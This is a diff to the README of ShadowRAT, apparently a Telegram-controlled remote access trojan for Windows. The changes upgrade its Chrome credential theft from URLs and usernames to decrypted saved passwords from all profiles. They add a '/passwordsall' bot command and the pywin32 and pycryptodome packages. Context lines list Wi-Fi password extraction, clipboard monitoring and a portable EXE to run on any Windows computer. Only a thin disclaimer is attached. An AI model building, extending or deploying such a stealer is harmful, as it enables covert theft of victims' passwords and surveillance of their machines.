@@ -202,7 +202,8 @@ The developer does NOT support using this tool for any malicious purposes and ke
 - Real-time clipboard monitoring
 
 ### Security & Passwords
-- Chrome login data extraction (URLs and usernames)
+- Extract Chrome saved passwords with decryption
+- Extract passwords from all Chrome profiles
 - Wi-Fi password extraction
 
 ### Messaging
@@ -268,7 +269,7 @@ cd ShadowRAT
 Copy and paste this command in Command Prompt:
 
 ```bash
-pip install pyautogui opencv-python pyttsx3 numpy pynput requests pytelegrambotapi pillow psutil pyaudio 
+pip install pyautogui opencv-python pyttsx3 numpy pynput requests pytelegrambotapi pillow psutil pywin32 pycryptodome pyaudio 
 ```
 
 If PyAudio gives an error, try these commands instead:
@@ -437,7 +438,8 @@ You can copy this single EXE file to any Windows computer and run it without ins
 |---------|-------------|
 | `/wifilist` | Show saved Wi-Fi networks |
 | `/wifipass [name]` | Show Wi-Fi password |
-| `/passwords` | Chrome login data extraction (URLs and usernames) |
+| `/passwords` | Extract Chrome saved passwords with decryption |
+| `/passwordsall` | Extract passwords from all Chrome profiles|
 | `/chrome [url]` | Open URL in Chrome |
 | `/edge [url]` | Open URL in Edge |
 | `/firefox [url]` | Open URL in Firefox |
